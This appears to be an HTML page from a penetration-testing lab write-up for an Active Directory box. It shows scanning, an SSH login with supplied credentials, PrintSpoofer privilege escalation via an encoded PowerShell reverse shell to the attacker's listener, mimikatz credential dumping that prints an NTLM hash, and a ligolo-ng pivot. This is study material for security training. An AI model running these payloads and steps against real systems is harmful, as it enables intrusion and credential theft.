@@ -1,0 +1,240 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX141 : AD</h1>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA/AD]
+└─$ sudo nmap -p- -sCV 192.168.xxx.140 --min-rate=10000   
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-23 17:46 EST
+Warning: 192.168.194.141 giving up on port because retransmission cap hit (10).
+Nmap scan report for 192.168.194.141
+Host is up (0.12s latency).
+Not shown: 63961 closed tcp ports (reset), 1555 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
+|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
+|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
+80/tcp    open  http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
+|_http-title: Home
+|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
+|_http-generator: Nicepage 4.8.2, nicepage.com
+| http-methods: 
+|_  Potentially risky methods: TRACE
+81/tcp    open  http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
+|_http-title: Attendance and Payroll System
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3306/tcp  open  mysql         MySQL (unauthorized)
+3307/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
+5040/tcp  open  unknown
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+51775/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre></div>
+<p class="text">To check the access privilege of Eric.Wallows, I used nxc.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA/AD]
+└─$ nxc ssh 192.168.214.141 -u Eric.Wallows -p 'EricLikesRunning800'
+SSH         192.168.214.141 22     192.168.214.141  [*] SSH-2.0-OpenSSH_for_Windows_8.1
+SSH         192.168.214.141 22     192.168.214.141  [+] Eric.Wallows:EricLikesRunning800 (Pwn3d!) with UAC - Windows - Shell access!  </code></pre></div>
+
+<p class="text">Since Eric.Wallows has access right via ssh, I used ssh to establish connection.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA/AD]
+└─$ ssh -o MACs=hmac-sha2-256 Eric.Wallows@192.168.214.141 
+The authenticity of host '192.168.214.141 (192.168.214.141)' can't be established.
+ED25519 key fingerprint is: SHA256:PMbZrT8kUg780yVuSoaF+1RVTe3iNvDE/DquCs74qWU
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:41: [hashed name]
+    ~/.ssh/known_hosts:43: [hashed name]
+    ~/.ssh/known_hosts:48: [hashed name]
+    ~/.ssh/known_hosts:49: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.214.141' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+
+Eric.Wallows@192.168.214.141's password: 
+Permission denied, please try again.
+Eric.Wallows@192.168.214.141's password: 
+Microsoft Windows [Version 10.0.19044.2251]
+(c) Microsoft Corporation. All rights reserved.
+                                               
+oscp\eric.wallows@MS01 C:\Users\eric.wallows>  </code></pre></div>
+
+<p class="text">I found Eric.Wallows has SeImpersonetePrivilege with below command.</p>
+<div class="code-box"><pre><code>oscp\eric.wallows@MS01 C:\Users\eric.wallows>whoami /priv
+
+PRIVILEGES INFORMATION                                                         
+----------------------                                                         
+                                                                               
+Privilege Name                Description                               State  
+============================= ========================================= =======
+SeShutdownPrivilege           Shut down the system                      Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeUndockPrivilege             Remove computer from docking station      Enabled
+<u>SeImpersonatePrivilege</u>        Impersonate a client after authentication Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+SeTimeZonePrivilege           Change the time zone                      Enabled</code></pre></div>
+<p class="text">To abuse this privilege, I uploaded PrintSpoofer. To upload, I used impacket-smbserver.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows/PrintSpoofer]
+└─$ impacket-smbserver share . -smb2support -username a -password a
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</code></pre></div>
+<div class="code-box"><pre><code>oscp\eric.wallows@MS01 C:\Users\eric.wallows\Desktop>net use \\192.168.45.164\share /user:a a       
+The command completed successfully.
+
+
+
+oscp\eric.wallows@MS01 C:\Users\eric.wallows\Desktop>copy \\192.168.45.164\share\PrintSpoofer64.exe PrintSpoofer64.exe
+        1 file(s) copied.</code></pre></div>
+
+<p class="text">Then, I created base64-encoded reverse shell command and connection with PrintSpoofer.</p>
+<div class="code-box"><pre><code>oscp\eric.wallows@MS01 C:\Users\eric.wallows\Desktop>.\PrintSpoofer64.exe -i -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdw
+AtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQA
+uADEANgA0ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBd
+AF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkA
+CgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC
+0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFM
+AdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAA
+fAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAK
+ABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQ
+BTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB
+0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBD
+AGwAbwBzAGUAKAApAA=="
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...</code></pre></div>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows/PrintSpoofer]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.164] from (UNKNOWN) [192.168.214.141] 52229
+whoami
+nt authority\system
+PS C:\Windows\system32> </code></pre></div>
+
+<p class="text">I got NA user shell.</p>
+<h2 class="subtitle">Information enumeration</h2>
+<p class="text">To extract all credentials stored in MS01, I uploaded mimikatz.exe.</p>
+<div class="code-box"><pre><code>nePS C:\users\administrator\desktop> t use \\192.168.45.164\share /user:a a
+The command completed successfully.
+
+PS C:\users\administrator\desktop> copy \\192.168.45.164\share\mimikatz.exe</code></pre></div>
+<p class="text">Then, performed credential extraction.</p>
+<div class="code-box"><pre><code>PS C:\users\administrator\desktop> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+...
+         [00000003] Primary
+         * Username : celia.almeda
+         * Domain   : OSCP
+         * NTLM     : e728ecbadfb02f51ce8eed753f3ff3fd
+         * SHA1     : 8cb61017910862af238631bf7aaae38df64998cd
+         * DPAPI    : f3ad0317c20e905dd62889dd51e7c52f</code></pre></div>
+
+         <p class="text">I found celia.almeda's NTLM hash.</p>
+<h2 class="subtitle">Pivot</h2>
+<p class="text">To get access with subnet IPs start from 10.10.xxx, I uploaded agent.exe to MS01.</p>
+<div class="code-box"><pre><code>oscp\eric.wallows@MS01 C:\Users\eric.wallows\Desktop>net use \\192.168.45.164\share /user:a a        
+The command completed successfully.
+
+
+oscp\eric.wallows@MS01 C:\Users\eric.wallows\Desktop>copy \\192.168.45.164\share\agent.exe    
+        1 file(s) copied.</code></pre></div>
+
+<p class="text">Then, I prepared tunnel with ligolo-ng</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ sudo ip tuntap add user $(whoami) mode tun ligolo
+
+┌──(kali㉿kali)-[~/utils/Windows]
+└─$ sudo ip link set ligolo up
+
+┌──(kali㉿kali)-[~/utils/Windows]
+└─$ ip addr show ligolo</code></pre></div>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Linux]
+└─$ ligolo-proxy -selfcert -laddr 0.0.0.0:9001
+INFO[0000] Loading configuration file ligolo-ng.yaml    
+WARN[0000] daemon configuration file not found. Creating a new one... 
+? Enable Ligolo-ng WebUI? Yes
+? Allow CORS Access from https://webui.ligolo.ng? Yes
+WARN[0001] WebUI enabled, default username and login are ligolo:password - make sure to update ligolo-ng.yaml to change credentials! 
+WARN[0002] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
+ERRO[0002] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
+INFO[0002] Listening on 0.0.0.0:9001                    
+INFO[0002] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
+WARN[0002] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _                                                                                
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/                                                                                
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /                                                                                 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                                                                  
+        /____/                          /____/                                                                                   
+                                                                                                                                 
+  Made in France ♥            by @Nicocha30!                                                                                     
+  Version: dev                                                                                                                   
+                                                                                                                                 
+ligolo-ng »</code></pre></div>
+<p class="text">On the target machine, I used agent.exe.</p>
+<div class="code-box"><pre><code>oscp\eric.wallows@MS01 C:\Users\eric.wallows\Desktop>.\agent.exe -connect 192.168.45.164:9001 -ignore-cert 
+time="2025-12-03T23:29:13-08:00" level=warning msg="warning, certificate validation disabled"
+time="2025-12-03T23:29:13-08:00" level=info msg="Connection established" addr="192.168.45.164:9001"</code></pre></div>
+<p class="text">On my local kali machine, agent joined message generated. I selected session 1</p>
+<div class="code-box"><pre><code>ligolo-ng » session
+? Specify a session : 1 - OSCP\eric.wallows@MS01 - 192.168.214.141:52237 - 005056abc354
+[Agent : OSCP\eric.wallows@MS01] »  </code></pre></div>
+<p class="text">And started session.</p>
+<div class="code-box"><pre><code>[Agent : OSCP\eric.wallows@MS01] »  tunnel_start --tun ligolo
+INFO[0213] Starting tunnel to OSCP\eric.wallows@MS01 (005056abc354) </code></pre></div>
+
+<p class="text">I added subnet to my local kali.</p>
+<div class="code-box"><pre><code>                                                                                                                                 
+┌──(kali㉿kali)-[~/utils/Linux]
+└─$ sudo ip route add 10.10.174.0/24 dev ligolo
+[sudo] password for kali: </code></pre></div>
+
+<p class="text">I confirmed that the tunnel is successfully established.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Linux]
+└─$ ping 10.10.174.140                                             
+PING 10.10.174.140 (10.10.174.140) 56(84) bytes of data.
+64 bytes from 10.10.174.140: icmp_seq=1 ttl=64 time=133 ms
+64 bytes from 10.10.174.140: icmp_seq=2 ttl=64 time=109 ms
+64 bytes from 10.10.174.140: icmp_seq=3 ttl=64 time=118 ms
+64 bytes from 10.10.174.140: icmp_seq=4 ttl=64 time=109 ms
+64 bytes from 10.10.174.140: icmp_seq=5 ttl=64 time=110 ms
+64 bytes from 10.10.174.140: icmp_seq=6 ttl=64 time=113 ms</code></pre></div>
+
+
+
+</body>
+</html>
